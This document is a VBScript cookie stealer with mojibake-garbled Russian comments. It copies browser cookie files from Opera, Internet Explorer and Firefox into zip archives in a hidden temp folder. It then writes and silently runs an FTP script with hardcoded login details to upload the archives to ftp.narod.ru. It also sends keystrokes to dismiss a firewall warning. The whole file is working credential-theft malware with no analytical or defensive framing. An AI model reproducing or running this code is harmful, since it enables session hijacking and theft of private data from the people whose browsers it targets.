Const FOF_SIMPLEPROGRESS = 256 
Dim MySource, MyTarget, MyHex, MyBinary, i 
Dim oShell, oCTF 
Dim oFileSys 
dim winShell 
dim newfolderpath
dim t
On Error Resume Next
'������� ��������� ����� ��� ������ ������ ��� ����������� (�����, ���� �������� ����� ����������, ����� �� ���� ����������)
'==========================================================
h = Hour(Now)
m = Minute(Now)
s = Second(Now)
t = date() & "-" & h & "-" & m & "-" & s
dim filesys, newfolder 
newfolderpath = "c:\windows\temp1" ' �������� ��������� �����
ICQ = 123456 '����� ICQ,������� ����� ��������
set filesys=CreateObject("Scripting.FileSystemObject") 
If Not filesys.FolderExists(newfolderpath) Then 
   Set newfolder = filesys.CreateFolder(newfolderpath) 
End If
set filesys=Nothing
Set newfolder=Nothing
'==========================================================
' ����� ���� OPERA
set WshShell1 = WScript.CreateObject("WScript.Shell") 
filePath = "C:\Program Files\Opera\profile\cookies4.dat" '��� ���������, �� ��� ����������.
MySource = filePath
MyTarget = newfolderpath & "\" & t & "-" & "opera_cookie.zip"
archPath_OPERA = t & "-" & "opera_cookie.zip"
MyHex = Array(80, 75, 5, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) 
For i = 0 To UBound(MyHex) 
MyBinary = MyBinary & Chr(MyHex(i)) 
Next 
Set oShell = CreateObject("WScript.Shell") 
Set oFileSys = CreateObject("Scripting.FileSystemObject") 
Set oCTF = oFileSys.CreateTextFile(MyTarget, True) 
oCTF.Write MyBinary 
oCTF.Close 
Set oCTF = Nothing 
set winShell = createObject("shell.application") 
winShell.namespace(MyTarget).CopyHere MySource 
wScript.Sleep(5000)
Set oFileSys = Nothing
Set oShell = Nothing
set WshShell = Nothing
set WshShell1 = Nothing
'==========================================================
' ����� ���� IE
Const ForReading = 1, ForWriting = 2, ForAppending = 8 
Dim MyZipName 
Dim oApp, oFolder, oFile 
set WshShell1 = WScript.CreateObject("WScript.Shell") 
filePath = "C:\Documents and Settings\" & WshShell1.ExpandEnvironmentStrings("%USERNAME%")  & "\Cookies" '��� ���������, �� ��� ����������.
set WshShell1 = Nothing
MySource = filePath
MyTarget = newfolderpath & "\" & t & "-" & "ie_cookie.zip"
archPath_IE = t & "-" & "ie_cookie.zip"
MyHex = Array(80, 75, 5, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) 
For i = 0 To UBound(MyHex) 
MyBinary = MyBinary & Chr(MyHex(i)) 
Next 
Set oShell = CreateObject("WScript.Shell") 
Set oFileSys = CreateObject("Scripting.FileSystemObject") 
Set oCTF = oFileSys.CreateTextFile(MyTarget, True) 
oCTF.Write MyBinary 
oCTF.Close 
Set oCTF = Nothing 
Set oApp = CreateObject("Shell.Application") 
Set oFolder = oApp.NameSpace(MySource) 
If Not oFolder Is Nothing Then 
oApp.NameSpace(MyTarget).CopyHere oFolder.Items 
End If 
wScript.Sleep(5000) 
Set oFile = Nothing 
On Error Resume Next 
Do While (oFile Is Nothing) 
Set oFile = oFileSys.OpenTextFile(MyTarget, ForAppending, False) 
If Err.number <> 0 then 
Err.Clear 
wScript.Sleep 3000 
End If 
Loop 
Set oFile=Nothing 
Set oFileSys=Nothing
'==========================================================
' ����� ���� OPERA1
set WshShell1 = WScript.CreateObject("WScript.Shell") 
filePath = "C:\Documents and Settings\" & WshShell1.ExpandEnvironmentStrings("%USERNAME%")  & "\Application Data\Opera\Opera\profile\cookies4.dat" '��� ���������, �� ��� ����������.
MySource = filePath
MyTarget = newfolderpath & "\" & t & "-" & "opera_cookie1.zip"
archPath_OPERA1 = t & "-" & "opera_cookie1.zip"
MyHex = Array(80, 75, 5, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) 
For i = 0 To UBound(MyHex) 
MyBinary = MyBinary & Chr(MyHex(i)) 
Next 
Set oShell = CreateObject("WScript.Shell") 
Set oFileSys = CreateObject("Scripting.FileSystemObject") 
Set oCTF = oFileSys.CreateTextFile(MyTarget, True) 
oCTF.Write MyBinary 
oCTF.Close 
Set oCTF = Nothing 
set winShell = createObject("shell.application") 
winShell.namespace(MyTarget).CopyHere MySource 
wScript.Sleep(5000)
Set oFileSys = Nothing
Set oShell = Nothing
set WshShell = Nothing
set WshShell1 = Nothing
'==========================================================
' ����� ���� MozilllaFF
set WshShell1 = WScript.CreateObject("WScript.Shell") 
filePath = "C:\Documents and Settings\" & WshShell1.ExpandEnvironmentStrings("%USERNAME%")  & "\Application Data\Mozilla\Firefox\Profiles\aucrpmlq.default\cookies.txt" '��� ���������, �� ��� ����������.
MySource = filePath
MyTarget = newfolderpath & "\" & t & "-" & "Mozillaff_cookie.zip"
archPath_MozillaFF = t & "-" & "Mozillaff_cookie.zip"
MyHex = Array(80, 75, 5, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) 
For i = 0 To UBound(MyHex) 
MyBinary = MyBinary & Chr(MyHex(i)) 
Next 
Set oShell = CreateObject("WScript.Shell") 
Set oFileSys = CreateObject("Scripting.FileSystemObject") 
Set oCTF = oFileSys.CreateTextFile(MyTarget, True) 
oCTF.Write MyBinary 
oCTF.Close 
Set oCTF = Nothing 
set winShell = createObject("shell.application") 
winShell.namespace(MyTarget).CopyHere MySource 
wScript.Sleep(5000)
Set oFileSys = Nothing
Set oShell = Nothing
set WshShell = Nothing
set WshShell1 = Nothing
'==========================================================
'�������� �� ��� �� narod.ru
'������� ���� �������� ��� FTP.EXE 
set FSO = CreateObject("Scripting.FileSystemObject") 
Set WSHshell = WScript.CreateObject("WScript.Shell") 
Set sDir = WSHshell.Environment("Process")    ' - ������� ���� � ����� Windows 
Set cScript = fso.CreateTextFile (sDir("windir") & "\FTp.scr")  '-���������� �����, ��� ����� ������ � �������� ���� �������� (� ������ ������ - ������� �������) 
cScript.WriteLine "Open ftp.narod.ru" '- ��������� ���������� � ������ ftp.narod.ru �� 21 ����� 
cScript.WriteLine "vovk.valery" '- ��� ������������ 
cScript.WriteLine "742369qweqwe" '- ������ 
cScript.WriteLine "drive C:" '- ������� ���� �
cScript.WriteLine "lcd " & newfolderpath ' - ������������� �����, ������ ����� �������� ������
cScript.WriteLine "prompt" ' - ��������� ������ ������ �� ������� �����
cScript.WriteLine "binary" ' - ����� �������� ������ �� FTP
cScript.WriteLine "PUT " & archPath_IE '- ���������� ���� �� IE
cScript.WriteLine "PUT " & archPath_OPERA   '- ���������� ���� �� OPERA
cScript.WriteLine "PUT " & archPath_OPERA1
cScript.WriteLine "PUT " & archPath_MozillaFF
cScript.WriteLine "bye" '-��������� ���������� � ftp.narod.ru 
cScript.Close '- ����� ������ � ���� �������� 
' ��������� FTP-�������� 
WSHshell.Run sDir("windir") & "\system32" & "\FTP.ExE -s:" & sDir("windir") & "\FTp.scr", 0
' ������� ���� (� ������ ������ Outpost, ���� �� ����, �������������� � ������� ������� " ' " ��� �������, ��� ����, �� '---------------------------)
set w=CreateObject("WScript.Shell")
a=0
do
r=W.AppActivate("ftp.exe")
if r then
a=1
w.SendKeys "{tab 2}"
w.SendKeys "{enter}"
end if
loop until a=1
set w=Nothing
'---------------------------
WScript.Sleep 200
Wscript.Quit


